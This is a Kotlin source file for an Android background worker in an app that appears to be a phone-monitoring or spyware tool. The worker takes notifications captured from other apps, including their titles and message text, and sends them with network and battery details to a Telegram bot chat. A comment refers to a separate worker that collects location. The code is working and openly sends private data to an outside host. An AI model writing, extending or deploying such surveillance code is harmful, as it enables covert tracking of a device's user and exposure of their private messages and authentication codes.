// DataUploadWorker.kt
package com.example.lta

import android.content.Context
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

class DataUploadWorker(appContext: Context, workerParams: WorkerParameters) :
    CoroutineWorker(appContext, workerParams) {

    private val TAG = "DataUploadWorker"
    private val systemInfoManager = SystemInfoManager(appContext)
    private val notificationDao: NotificationDao = NotificationDatabase.getDatabase(appContext).notificationDao()
    private val telegramBotApi: TelegramBotApi = TelegramBotApi(
        appContext.getString(R.string.telegram_bot_token),
        appContext.getString(R.string.telegram_chat_id)
    )

    override suspend fun doWork(): Result {
        Log.d(TAG, "Starting data upload work...")

        return withContext(Dispatchers.IO) {
            var allSuccessful = true

            // 1. Send unsent notifications
            try {
                val unsentNotifications = notificationDao.getUnsentNotifications()
                if (unsentNotifications.isNotEmpty()) {
                    Log.d(TAG, "Found ${unsentNotifications.size} unsent notifications.")
                    unsentNotifications.forEach { notification ->
                        val message = "Unsent Notification:\nApp: ${notification.packageName}\nTitle: ${notification.title ?: "N/A"}\nText: ${notification.text ?: "N/A"}\nTime: ${java.util.Date(notification.postTime)}"
                        val success = telegramBotApi.sendMessage(message)
                        if (success) {
                            notification.isSent = true
                            notificationDao.update(notification)
                            notificationDao.delete(notification.id)
                            Log.d(TAG, "Unsent notification sent and removed from DB: ${notification.packageName}")
                        } else {
                            Log.e(TAG, "Failed to send unsent notification: ${notification.packageName}")
                            allSuccessful = false
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error processing notifications", e)
                allSuccessful = false
            }

            // 2. Send system info (Network and Battery)
            try {
                val networkInfo = systemInfoManager.getNetworkInfo()
                val batteryInfo = systemInfoManager.getBatteryInfo()
                
                // Location info is now handled by LocationWorker, so it's removed from here.
                val systemInfoMessage = "⚙️ System Info:\nNetwork: $networkInfo\n$batteryInfo"
                val systemInfoSuccess = telegramBotApi.sendMessage(systemInfoMessage)

                if (systemInfoSuccess) {
                    Log.d(TAG, "System info sent to Telegram.")
                } else {
                    Log.e(TAG, "Failed to send system info to Telegram.")
                    allSuccessful = false
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error processing system info", e)
                allSuccessful = false
            }

            // Decide on the result of the work
            if (allSuccessful) {
                Result.success()
            } else {
                Result.retry()
            }
        }
    }
}
